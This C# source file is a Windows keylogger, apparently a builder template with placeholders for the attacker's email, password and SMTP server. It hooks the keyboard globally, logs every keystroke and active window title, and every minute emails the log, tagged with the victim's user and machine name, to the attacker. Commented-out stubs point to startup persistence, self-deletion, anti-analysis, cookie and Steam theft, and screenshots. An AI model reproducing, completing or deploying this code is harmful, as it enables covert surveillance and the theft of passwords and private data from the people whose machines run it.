using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Drawing;
using System.Drawing.Imaging;
using System.Collections.Generic;
using System.Security.Cryptography;
using Microsoft.Win32;
using System.Media;
using System.Resources;

class WindowsLocalHostProcess
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_KEYUP = 0x101;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    static bool capped = false;
    static bool shiftcapped = false;
    static string window = string.Empty;
    static Thread get;
    static Thread send;
    static int time = 60000;
    static string contents = string.Empty;
    [STAThread]
    public static void Main()
    {
        //AntiRun();
        //aHAL();
        //Melt();
        //AddToStartup();
        //Alert();
        //Cookies();
        //Message();
        //Penis();
        //Thread f = new Thread(Flash); f.Start();
        //Meatspin();
        //Thread stm = new Thread(Steam); stm.Start();
        //Thread ie = new Thread(IEDefault); ie.Start();
        //Thread wp = new Thread(WallPaper); wp.Start();
        //Thread cdThread = new Thread(CD); cdThread.Start();
        get = new Thread(GetWindow);
        get.IsBackground = true;
        get.Start();
        send = new Thread(Send);
        send.IsBackground = true;
        send.Start();
        //var handle = GetConsoleWindow();
        //ShowWindow(handle, SW_HIDE);

        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);

    }

    //[Startup]

    //[Antis]

    //[Melt]

    //[Cookies]

    //[Message]

    //[Penis]

    //[Flash]

    //[Meatspin]

    //[Steam]

    //[Alert]

    //[IE]

    //[WP]

    //[CD]

    static void Send()
    {
        int t = 0;
        while (t < time)
        {
            Thread.Sleep(1000);
            t += 1000;
        }
        if (contents == string.Empty)
        {
            Send();
            return;
        }
        try
        {
            //[Screenshot]
            //[ClipboardC]
            NetworkCredential creds = new NetworkCredential(Decrypt("[EMAIL]", "[PASS]"), Decrypt("[PASSWORD]", "[PASS]"));
            MailMessage mail = new MailMessage();
            mail.To.Add(Decrypt("[EMAIL]", "[PASS]"));
            mail.From = new MailAddress(Decrypt("[EMAIL]", "[PASS]"));
            mail.Subject = Environment.UserName + "@" + Environment.MachineName + " Logs";
            mail.Body = contents;
            //mail.Attachments.Add(a);

            SmtpClient client = new SmtpClient("[EMAIL SERVER]", Convert.ToInt32("[SERVER PORT]"));
            client.DeliveryMethod = SmtpDeliveryMethod.Network;
            client.Credentials = creds;
            client.EnableSsl = true;
            client.Send(mail);
            contents = string.Empty;
            //ms.Close();
            GC.Collect();
        }
        catch { }

        Send();

    }

    private static Bitmap GetScreenShot()
    {
        Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        Graphics graphics = Graphics.FromImage(bitmap as Image);
        graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);

        return bitmap;
    }

    static string Decrypt(string InputText, string Password)
    {
        try
        {
            RijndaelManaged managed = new RijndaelManaged();
            byte[] buffer = Convert.FromBase64String(InputText);
            byte[] rgbSalt = Encoding.ASCII.GetBytes(Password.Length.ToString());
            PasswordDeriveBytes bytes = new PasswordDeriveBytes(Password, rgbSalt);
            ICryptoTransform transform = managed.CreateDecryptor(bytes.GetBytes(0x10), bytes.GetBytes(0x10));
            MemoryStream stream = new MemoryStream(buffer);
            CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read);
            byte[] buffer3 = new byte[buffer.Length];
            int count = stream2.Read(buffer3, 0, buffer3.Length);
            stream.Close();
            stream2.Close();
            return Encoding.Unicode.GetString(buffer3, 0, count);
        }
        catch
        {
            return InputText;
        }
    }

    static void GetWindow()
    {
        while (true)
        {
            if (GetActiveWindowTitle() != window && GetActiveWindowTitle() != null)
            {
                //using (StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true))
                //{
                    //sw.Write("\n\n[" + System.DateTime.Now.ToShortTimeString() + "][" + GetActiveWindowTitle() + "]\n\n");
                    contents = contents + "\n\n[" + System.DateTime.Now.ToShortTimeString() + "][" + GetActiveWindowTitle() + "]\n\n";
                //}
                window = GetActiveWindowTitle();
            }
            Thread.Sleep(500);
        }
    }

    [DllImport("user32.dll")]
    static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    private static string GetActiveWindowTitle()
    {
        const int nChars = 256;
        IntPtr handle = IntPtr.Zero;
        StringBuilder Buff = new StringBuilder(nChars);
        handle = GetForegroundWindow();

        if (GetWindowText(handle, Buff, nChars) > 0)
        {
            return Buff.ToString();
        }
        return null;
    }
    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            switch ((Keys)vkCode)
            {

                case Keys.LShiftKey:
                    if (Control.IsKeyLocked(Keys.Capital) || Control.IsKeyLocked(Keys.CapsLock)) { shiftcapped = false; capped = true; }
                    if (Control.IsKeyLocked(Keys.Capital) == false || Control.IsKeyLocked(Keys.CapsLock) == false) { shiftcapped = false; capped = false; }
                    break;
                case Keys.RShiftKey:
                    if (Control.IsKeyLocked(Keys.Capital) || Control.IsKeyLocked(Keys.CapsLock)) { shiftcapped = false; capped = true; }
                    if (Control.IsKeyLocked(Keys.Capital) == false || Control.IsKeyLocked(Keys.CapsLock) == false) { shiftcapped = false; capped = false; }
                    break;
                case Keys.Capital:
                    if (Control.IsKeyLocked(Keys.Capital) || Control.IsKeyLocked(Keys.CapsLock)) { capped = true; }
                    if (Control.IsKeyLocked(Keys.Capital) == false || Control.IsKeyLocked(Keys.CapsLock) == false) { capped = false; }
                    break;
            }
        }
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((Keys)vkCode);
            string key = null;
            switch ((Keys)vkCode)
            {
                case Keys.LShiftKey:
                    shiftcapped = true;
                    key = "";
                    break;
                case Keys.RShiftKey:
                    shiftcapped = true;
                    key = "";
                    break;
                case Keys.Oemcomma:
                    key = ",";
                    if (shiftcapped) { key = "<"; }
                    break;
                case Keys.OemPeriod:
                    key = ".";
                    if (shiftcapped) { key = ">"; }
                    break;
                case Keys.OemQuestion:
                    key = "/";
                    if (shiftcapped) { key = "?"; }
                    break;
                case Keys.Oem1:
                    key = ";";
                    if (shiftcapped) { key = ":"; }
                    break;
                case Keys.Oem7:
                    key = "'";
                    if (shiftcapped) { key = "\""; }
                    break;
                case Keys.OemOpenBrackets:
                    key = "[";
                    if (shiftcapped) { key = "{"; }
                    break;
                case Keys.Oem6:
                    key = "]";
                    if (shiftcapped) { key = "}"; }
                    break;
                case Keys.Oem5:
                    key = "\\";
                    if (shiftcapped) { key = "|"; }
                    break;
                case Keys.D1:
                    key = "1";
                    if (shiftcapped) { key = "!"; }
                    break;
                case Keys.D2:
                    key = "2";
                    if (shiftcapped) { key = "@"; }
                    break;
                case Keys.D3:
                    key = "3";
                    if (shiftcapped) { key = "#"; }
                    break;
                case Keys.D4:
                    key = "4";
                    if (shiftcapped) { key = "$"; }
                    break;
                case Keys.D5:
                    key = "5";
                    if (shiftcapped) { key = "%"; }
                    break;
                case Keys.D6:
                    key = "6";
                    if (shiftcapped) { key = "^"; }
                    break;
                case Keys.D7:
                    key = "7";
                    if (shiftcapped) { key = "&"; }
                    break;
                case Keys.D8:
                    key = "8";
                    if (shiftcapped) { key = "*"; }
                    break;
                case Keys.D9:
                    key = "9";
                    if (shiftcapped) { key = "("; }
                    break;
                case Keys.D0:
                    key = "0";
                    if (shiftcapped) { key = ")"; }
                    break;
                case Keys.OemMinus:
                    key = "-";
                    if (shiftcapped) { key = "_"; }
                    break;
                case Keys.Oemplus:
                    key = "=";
                    if (shiftcapped) { key = "+"; }
                    break;
                case Keys.Back:
                    key = "[-BACK-]";
                    break;
                case Keys.LControlKey:
                    key = "[-CTRL-]";
                    break;
                case Keys.RControlKey:
                    key = "[-CTRL-]";
                    break;
                case Keys.Return:
                    key = "\n[-ENTER-]\n";
                    //Penis();
                    break;
                case Keys.LMenu:
                    key = "[-ALT-]";
                    break;
                case Keys.RMenu:
                    key = "[-ALT-]";
                    break;
                case Keys.Oemtilde:
                    key = "`";
                    if (shiftcapped) { key = "~"; }
                    break;
                case Keys.LWin:
                    key = "[-WIN-]";
                    break;
                case Keys.RWin:
                    key = "[-WIN-]";
                    break;
                case Keys.Tab:
                    key = "[-TAB-]";
                    break;
                case Keys.Capital:
                    key = "[-CAPS-]";
                    if (shiftcapped) { shiftcapped = false; }
                    if (shiftcapped == false) { shiftcapped = true; }
                    break;
                case Keys.Space:
                    key = " ";
                    break;
                case Keys.Delete:
                    key = "[-DEL-]";
                    break;
                case Keys.Left:
                    key = "[-LEFT-]";
                    break;
                case Keys.Right:
                    key = "[-RIGHT-]";
                    break;
                case Keys.Down:
                    key = "[-DOWN-]";
                    break;
                case Keys.Up:
                    key = "[-UP-]";
                    break;
            }
            //StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
            if (key == null)
            {
                if (shiftcapped || capped) { //sw.Write((Keys)vkCode); 
                    contents = contents + (Keys)vkCode; }
                if (shiftcapped == false && capped == false) { //sw.Write(Convert.ToString((Keys)vkCode).ToLower()); 
                    contents = contents + Convert.ToString((Keys)vkCode).ToLower(); }
            }
            else
            {
                //sw.Write(key); 
                contents = contents + key;
            }
            //sw.Close();
        }

        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

}